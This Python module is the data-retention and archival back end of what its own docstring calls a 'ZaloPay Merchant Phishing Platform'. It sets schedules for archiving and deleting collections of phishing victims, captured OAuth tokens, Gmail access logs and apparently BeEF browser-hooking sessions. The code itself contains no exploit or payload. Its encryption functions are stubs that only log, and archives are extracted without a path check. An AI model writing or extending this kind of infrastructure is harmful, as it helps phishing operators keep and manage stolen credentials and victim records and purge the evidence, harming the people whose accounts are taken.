"""
Data Retention and Archival System
Automated data cleanup and encrypted storage for the ZaloPay Merchant Phishing Platform
"""

import os
import json
import gzip
import shutil
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any, Optional, Tuple
import logging
from pathlib import Path
import asyncio
from dataclasses import dataclass, asdict
import hashlib
import tarfile

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class RetentionPolicy:
    """Data retention policy configuration"""
    collection_name: str
    retention_days: int
    archive_days: int
    delete_days: int
    archive_compression: bool
    archive_encryption: bool
    conditions: Dict[str, Any]
    priority: int

@dataclass
class ArchiveMetadata:
    """Archive metadata"""
    archive_id: str
    collection_name: str
    start_date: datetime
    end_date: datetime
    document_count: int
    archive_size: int
    compression_ratio: float
    encryption_key_id: str
    created_at: datetime
    checksum: str

class DataRetentionManager:
    """Data retention and archival manager"""
    
    def __init__(self, mongodb_connection=None, archive_storage_path: str = None):
        self.mongodb = mongodb_connection
        self.archive_storage_path = archive_storage_path or os.getenv("ARCHIVE_STORAGE_PATH", "./archives")
        self.retention_policies = {}
        self.archive_metadata = {}
        
        # Create archive storage directory
        Path(self.archive_storage_path).mkdir(parents=True, exist_ok=True)
        
        # Initialize retention policies
        self._initialize_retention_policies()
    
    def _initialize_retention_policies(self):
        """Initialize default retention policies"""
        self.retention_policies = {
            "activity_logs": RetentionPolicy(
                collection_name="activity_logs",
                retention_days=90,
                archive_days=30,
                delete_days=365,
                archive_compression=True,
                archive_encryption=True,
                conditions={"severity": {"$in": ["info", "warning"]}},
                priority=1
            ),
            "system_metrics": RetentionPolicy(
                collection_name="system_metrics",
                retention_days=30,
                archive_days=7,
                delete_days=180,
                archive_compression=True,
                archive_encryption=False,
                conditions={},
                priority=2
            ),
            "attribution_events": RetentionPolicy(
                collection_name="attribution_events",
                retention_days=60,
                archive_days=30,
                delete_days=365,
                archive_compression=True,
                archive_encryption=True,
                conditions={},
                priority=3
            ),
            "gmail_access_logs": RetentionPolicy(
                collection_name="gmail_access_logs",
                retention_days=180,
                archive_days=90,
                delete_days=730,
                archive_compression=True,
                archive_encryption=True,
                conditions={"success": True},
                priority=4
            ),
            "conversion_events": RetentionPolicy(
                collection_name="conversion_events",
                retention_days=365,
                archive_days=180,
                delete_days=1095,
                archive_compression=True,
                archive_encryption=True,
                conditions={},
                priority=5
            ),
            "victims": RetentionPolicy(
                collection_name="victims",
                retention_days=1095,  # 3 years
                archive_days=730,     # 2 years
                delete_days=1825,    # 5 years
                archive_compression=True,
                archive_encryption=True,
                conditions={"status": "deleted"},
                priority=6
            ),
            "oauth_tokens": RetentionPolicy(
                collection_name="oauth_tokens",
                retention_days=30,
                archive_days=7,
                delete_days=90,
                archive_compression=True,
                archive_encryption=True,
                conditions={"is_valid": False},
                priority=7
            ),
            "beef_sessions": RetentionPolicy(
                collection_name="beef_sessions",
                retention_days=90,
                archive_days=30,
                delete_days=365,
                archive_compression=True,
                archive_encryption=True,
                conditions={"status": "expired"},
                priority=8
            )
        }
    
    def add_retention_policy(self, policy: RetentionPolicy):
        """Add a new retention policy"""
        self.retention_policies[policy.collection_name] = policy
        logger.info(f"Added retention policy for {policy.collection_name}")
    
    def get_retention_policy(self, collection_name: str) -> Optional[RetentionPolicy]:
        """Get retention policy for a collection"""
        return self.retention_policies.get(collection_name)
    
    async def process_retention_policies(self):
        """Process all retention policies"""
        try:
            logger.info("Starting retention policy processing")
            
            # Sort policies by priority
            sorted_policies = sorted(
                self.retention_policies.values(),
                key=lambda x: x.priority
            )
            
            for policy in sorted_policies:
                try:
                    await self._process_collection_retention(policy)
                except Exception as e:
                    logger.error(f"Error processing retention for {policy.collection_name}: {e}")
                    continue
            
            logger.info("Retention policy processing completed")
            
        except Exception as e:
            logger.error(f"Error processing retention policies: {e}")
            raise
    
    async def _process_collection_retention(self, policy: RetentionPolicy):
        """Process retention for a specific collection"""
        try:
            collection = self.mongodb[policy.collection_name]
            now = datetime.now(timezone.utc)
            
            # Calculate date thresholds
            archive_threshold = now - timedelta(days=policy.archive_days)
            delete_threshold = now - timedelta(days=policy.delete_days)
            
            # Find documents to archive
            archive_query = {
                "created_at": {"$lt": archive_threshold},
                **policy.conditions
            }
            
            documents_to_archive = list(collection.find(archive_query))
            
            if documents_to_archive:
                logger.info(f"Archiving {len(documents_to_archive)} documents from {policy.collection_name}")
                await self._archive_documents(policy, documents_to_archive)
                
                # Remove archived documents from collection
                result = collection.delete_many(archive_query)
                logger.info(f"Removed {result.deleted_count} archived documents from {policy.collection_name}")
            
            # Find documents to delete permanently
            delete_query = {
                "created_at": {"$lt": delete_threshold},
                **policy.conditions
            }
            
            documents_to_delete = list(collection.find(delete_query))
            
            if documents_to_delete:
                logger.info(f"Deleting {len(documents_to_delete)} documents from {policy.collection_name}")
                result = collection.delete_many(delete_query)
                logger.info(f"Permanently deleted {result.deleted_count} documents from {policy.collection_name}")
            
        except Exception as e:
            logger.error(f"Error processing retention for {policy.collection_name}: {e}")
            raise
    
    async def _archive_documents(self, policy: RetentionPolicy, documents: List[Dict[str, Any]]):
        """Archive documents to compressed/encrypted storage"""
        try:
            if not documents:
                return
            
            # Generate archive ID
            archive_id = f"{policy.collection_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Create archive metadata
            start_date = min(doc.get("created_at", datetime.now()) for doc in documents)
            end_date = max(doc.get("created_at", datetime.now()) for doc in documents)
            
            # Prepare documents for archiving
            archive_data = {
                "metadata": {
                    "archive_id": archive_id,
                    "collection_name": policy.collection_name,
                    "document_count": len(documents),
                    "start_date": start_date.isoformat(),
                    "end_date": end_date.isoformat(),
                    "created_at": datetime.now(timezone.utc).isoformat(),
                    "retention_policy": asdict(policy)
                },
                "documents": documents
            }
            
            # Serialize data
            json_data = json.dumps(archive_data, default=str, indent=2)
            data_bytes = json_data.encode('utf-8')
            
            # Calculate checksum
            checksum = hashlib.sha256(data_bytes).hexdigest()
            
            # Create archive file path
            archive_filename = f"{archive_id}.tar.gz"
            archive_path = os.path.join(self.archive_storage_path, archive_filename)
            
            # Create compressed archive
            with tarfile.open(archive_path, "w:gz") as tar:
                # Create a temporary file for the JSON data
                temp_file = f"/tmp/{archive_id}.json"
                with open(temp_file, 'w') as f:
                    f.write(json_data)
                
                # Add to tar archive
                tar.add(temp_file, arcname=f"{archive_id}.json")
                
                # Clean up temp file
                os.remove(temp_file)
            
            # Encrypt archive if required
            if policy.archive_encryption:
                await self._encrypt_archive(archive_path, archive_id)
            
            # Calculate final archive size
            archive_size = os.path.getsize(archive_path)
            compression_ratio = len(data_bytes) / archive_size if archive_size > 0 else 1.0
            
            # Create archive metadata
            archive_metadata = ArchiveMetadata(
                archive_id=archive_id,
                collection_name=policy.collection_name,
                start_date=start_date,
                end_date=end_date,
                document_count=len(documents),
                archive_size=archive_size,
                compression_ratio=compression_ratio,
                encryption_key_id=archive_id if policy.archive_encryption else None,
                created_at=datetime.now(timezone.utc),
                checksum=checksum
            )
            
            # Store metadata
            self.archive_metadata[archive_id] = archive_metadata
            await self._store_archive_metadata(archive_metadata)
            
            logger.info(f"Archived {len(documents)} documents to {archive_filename} (size: {archive_size} bytes, compression: {compression_ratio:.2f})")
            
        except Exception as e:
            logger.error(f"Error archiving documents: {e}")
            raise
    
    async def _encrypt_archive(self, archive_path: str, archive_id: str):
        """Encrypt archive file"""
        try:
            # This would integrate with the encryption manager
            # For now, just log the encryption requirement
            logger.info(f"Encrypting archive {archive_id}")
            
            # TODO: Implement actual encryption using encryption manager
            # encrypted_path = f"{archive_path}.enc"
            # encryption_manager.encrypt_file(archive_path, encrypted_path, archive_id)
            # os.remove(archive_path)
            # os.rename(encrypted_path, archive_path)
            
        except Exception as e:
            logger.error(f"Error encrypting archive: {e}")
            raise
    
    async def _store_archive_metadata(self, metadata: ArchiveMetadata):
        """Store archive metadata in database"""
        try:
            if not self.mongodb:
                return
            
            collection = self.mongodb.archive_metadata
            collection.insert_one(asdict(metadata))
            
        except Exception as e:
            logger.error(f"Error storing archive metadata: {e}")
            raise
    
    async def restore_archive(self, archive_id: str, target_collection: str = None) -> List[Dict[str, Any]]:
        """Restore documents from archive"""
        try:
            # Get archive metadata
            metadata = self.archive_metadata.get(archive_id)
            if not metadata:
                # Try to load from database
                if self.mongodb:
                    collection = self.mongodb.archive_metadata
                    metadata_doc = collection.find_one({"archive_id": archive_id})
                    if metadata_doc:
                        metadata = ArchiveMetadata(**metadata_doc)
            
            if not metadata:
                raise ValueError(f"Archive {archive_id} not found")
            
            # Determine target collection
            target_collection = target_collection or metadata.collection_name
            
            # Find archive file
            archive_filename = f"{archive_id}.tar.gz"
            archive_path = os.path.join(self.archive_storage_path, archive_filename)
            
            if not os.path.exists(archive_path):
                raise FileNotFoundError(f"Archive file {archive_filename} not found")
            
            # Decrypt if necessary
            if metadata.encryption_key_id:
                await self._decrypt_archive(archive_path, archive_id)
            
            # Extract archive
            temp_dir = f"/tmp/restore_{archive_id}"
            os.makedirs(temp_dir, exist_ok=True)
            
            with tarfile.open(archive_path, "r:gz") as tar:
                tar.extractall(temp_dir)
            
            # Load JSON data
            json_file = os.path.join(temp_dir, f"{archive_id}.json")
            with open(json_file, 'r') as f:
                archive_data = json.load(f)
            
            # Clean up temp directory
            shutil.rmtree(temp_dir)
            
            # Restore documents to target collection
            if self.mongodb:
                collection = self.mongodb[target_collection]
                documents = archive_data["documents"]
                
                if documents:
                    collection.insert_many(documents)
                    logger.info(f"Restored {len(documents)} documents to {target_collection}")
                
                return documents
            
            return archive_data["documents"]
            
        except Exception as e:
            logger.error(f"Error restoring archive {archive_id}: {e}")
            raise
    
    async def _decrypt_archive(self, archive_path: str, archive_id: str):
        """Decrypt archive file"""
        try:
            # This would integrate with the encryption manager
            logger.info(f"Decrypting archive {archive_id}")
            
            # TODO: Implement actual decryption using encryption manager
            # decrypted_path = f"{archive_path}.dec"
            # encryption_manager.decrypt_file(archive_path, decrypted_path, archive_id)
            # os.remove(archive_path)
            # os.rename(decrypted_path, archive_path)
            
        except Exception as e:
            logger.error(f"Error decrypting archive: {e}")
            raise
    
    def get_archive_list(self) -> List[Dict[str, Any]]:
        """Get list of all archives"""
        try:
            archives = []
            
            for archive_id, metadata in self.archive_metadata.items():
                archives.append({
                    "archive_id": metadata.archive_id,
                    "collection_name": metadata.collection_name,
                    "document_count": metadata.document_count,
                    "archive_size": metadata.archive_size,
                    "compression_ratio": metadata.compression_ratio,
                    "created_at": metadata.created_at.isoformat(),
                    "checksum": metadata.checksum
                })
            
            return sorted(archives, key=lambda x: x["created_at"], reverse=True)
            
        except Exception as e:
            logger.error(f"Error getting archive list: {e}")
            return []
    
    def get_archive_metadata(self, archive_id: str) -> Optional[ArchiveMetadata]:
        """Get metadata for a specific archive"""
        return self.archive_metadata.get(archive_id)
    
    def delete_archive(self, archive_id: str) -> bool:
        """Delete an archive file and metadata"""
        try:
            # Get metadata
            metadata = self.archive_metadata.get(archive_id)
            if not metadata:
                return False
            
            # Delete archive file
            archive_filename = f"{archive_id}.tar.gz"
            archive_path = os.path.join(self.archive_storage_path, archive_filename)
            
            if os.path.exists(archive_path):
                os.remove(archive_path)
            
            # Remove from metadata
            del self.archive_metadata[archive_id]
            
            # Remove from database
            if self.mongodb:
                collection = self.mongodb.archive_metadata
                collection.delete_one({"archive_id": archive_id})
            
            logger.info(f"Deleted archive {archive_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error deleting archive {archive_id}: {e}")
            return False
    
    def get_retention_stats(self) -> Dict[str, Any]:
        """Get retention statistics"""
        try:
            stats = {
                "total_policies": len(self.retention_policies),
                "total_archives": len(self.archive_metadata),
                "total_archive_size": sum(meta.archive_size for meta in self.archive_metadata.values()),
                "policies": {},
                "archives_by_collection": {}
            }
            
            # Policy statistics
            for collection_name, policy in self.retention_policies.items():
                stats["policies"][collection_name] = {
                    "retention_days": policy.retention_days,
                    "archive_days": policy.archive_days,
                    "delete_days": policy.delete_days,
                    "compression": policy.archive_compression,
                    "encryption": policy.archive_encryption,
                    "priority": policy.priority
                }
            
            # Archive statistics by collection
            for metadata in self.archive_metadata.values():
                collection = metadata.collection_name
                if collection not in stats["archives_by_collection"]:
                    stats["archives_by_collection"][collection] = {
                        "count": 0,
                        "total_size": 0,
                        "total_documents": 0
                    }
                
                stats["archives_by_collection"][collection]["count"] += 1
                stats["archives_by_collection"][collection]["total_size"] += metadata.archive_size
                stats["archives_by_collection"][collection]["total_documents"] += metadata.document_count
            
            return stats
            
        except Exception as e:
            logger.error(f"Error getting retention stats: {e}")
            return {}
    
    async def cleanup_old_archives(self, max_age_days: int = 365):
        """Clean up archives older than specified days"""
        try:
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=max_age_days)
            archives_to_delete = []
            
            for archive_id, metadata in self.archive_metadata.items():
                if metadata.created_at < cutoff_date:
                    archives_to_delete.append(archive_id)
            
            deleted_count = 0
            for archive_id in archives_to_delete:
                if self.delete_archive(archive_id):
                    deleted_count += 1
            
            logger.info(f"Cleaned up {deleted_count} old archives")
            return deleted_count
            
        except Exception as e:
            logger.error(f"Error cleaning up old archives: {e}")
            return 0

# Global data retention manager instance
data_retention_manager = None

def initialize_data_retention_manager(mongodb_connection=None, archive_storage_path: str = None) -> DataRetentionManager:
    """Initialize data retention manager"""
    global data_retention_manager
    data_retention_manager = DataRetentionManager(mongodb_connection, archive_storage_path)
    return data_retention_manager

def get_data_retention_manager() -> DataRetentionManager:
    """Get data retention manager instance"""
    global data_retention_manager
    if data_retention_manager is None:
        data_retention_manager = DataRetentionManager()
    return data_retention_manager
